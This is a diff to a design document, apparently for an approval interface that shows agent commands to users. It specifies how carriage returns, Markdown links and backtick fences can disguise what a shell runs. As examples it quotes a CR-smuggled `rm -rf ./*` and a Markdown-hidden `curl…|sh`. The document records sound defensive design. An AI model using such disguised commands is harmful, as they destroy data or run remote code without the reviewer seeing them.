@@ -651,7 +651,11 @@ joined words at a separator, since a fact can carry a delegate's name (#286).
   markers included, in the code face; nothing in it is read as Markdown.** It is one block, read
   left to right with its line breaks kept, and escaped as every code block is (hidden characters,
   right-to-left letters and a bare carriage return), with the same notes, and Approve once still
-  offered. **It has no Copy:** the block is the whole message, prose and fence lines too, and pasted
+  offered. **Its notes are read from the message as it came** (#423): a CRLF is drawn as the line
+  ending it is, but its CR is still in what runs, so the card says "Contains hidden characters"
+  for it, as the Needs you lane refuses it (`cd /tmp/scratch\r\nrm -rf ./*` in bash fails the
+  `cd` and runs the `rm` where it is). The app follows in #422.
+  **It has no Copy:** the block is the whole message, prose and fence lines too, and pasted
   into bash a line of backticks runs as a command substitution. Ordinary code blocks keep Copy. Whatever a parser decides can hide what runs: a link draws
   `echo "[safe](https://a/";curl…|sh;")"` as `echo "safe"`, `*tmp*` loses its stars, and a line
   of three backticks, which Markdown takes as a fence, is a command substitution to bash, so a
